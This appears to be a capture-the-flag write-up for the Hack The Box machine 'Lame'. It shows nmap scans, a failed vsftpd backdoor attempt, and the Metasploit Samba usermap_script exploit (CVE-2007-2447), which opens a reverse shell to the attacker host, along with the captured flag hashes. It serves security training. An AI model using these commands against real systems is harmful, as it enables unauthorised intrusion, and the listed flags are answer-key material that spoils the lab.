---
{"dg-publish":true,"permalink":"/boxer/lame/"}
---

## Writeup
1. Initial Recon

``` 
sudo nmap -sT -vvv -n -Pn -p- -oG allPorts 10.10.10.3
```

![Pasted image 20240628135741.png](/img/user/Sources/Pasted%20image%2020240628135741.png)

2. Enumeration
```
sudo nmap -sT -Pn -sV 10.10.10.3 
```

![Pasted image 20240628135907.png](/img/user/Sources/Pasted%20image%2020240628135907.png)

```
sudo nmap --script=smb-os-discovery -p139,445 10.10.10.3
```

![Pasted image 20240628140045.png](/img/user/Sources/Pasted%20image%2020240628140045.png)

- As we have enumerated two services of ftp (Vsftpd 2.3.4) and SMB (Samba 3.0.30-Debian) we will try to search for potential exploits

3. Gaining Access and Exploitation

- In order to gain access we try searching version linked vulnerabilities in Vsftpd service
- We search using metasploit to discover possible exploits

```
msf6 > search name:vsftpd type:exploit
msf6 > use 0

msf6 > exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3

```

![Pasted image 20240628140728.png](/img/user/Sources/Pasted%20image%2020240628140728.png)

- As we have setup up the exploit we try running it to see if we gain access

```
msf6 > exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exit
```

- We were unable to gain access through this service exploit lets research the other service at hand Samba 3.0.20
- Upon exploration we discover that there is a 2007 CVE attached to this version [CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447#:~:text=The%20MS%2DRPC%20functionality%20in,%22username%20map%20script%22%20smb.)
- We can now search for potential exploits in a similar manner for this particular vulnerability

```
msf6 > search name:Samba 3.0.20 type:exploit

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0

```

![Pasted image 20240628142654.png](/img/user/Sources/Pasted%20image%2020240628142654.png)

4. Maintaining access and Extracting outputs
- Now we have gained access so let's extract the details using the reverse shell
```
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.41:4444 
[*] Command shell session 1 opened (10.10.14.41:4444 -> 10.10.10.3:49101) at 2024-06-28 04:09:57 -0400

pwd
/
```

- After entering the shell we determine the list of directories
![Pasted image 20240628143012.png](/img/user/Sources/Pasted%20image%2020240628143012.png)

- Makis seems interesting let's explore it further and we seem to have a flag text file
![Pasted image 20240628143012.png](/img/user/Sources/Pasted%20image%2020240628143012.png)
```
Flag user: 0e414761cc5078a6b6741214b7c8f730
```

- Now let's explore the home directory to explore its contents, and seems like we have our root flag text here
![Pasted image 20240628143145.png](/img/user/Sources/Pasted%20image%2020240628143145.png)
```
Flag user: ef2edc5988887baec7cead2aaeb880fd
```

5. We have officially pwned the box!

![pwned.png](/img/user/Sources/pwned.png)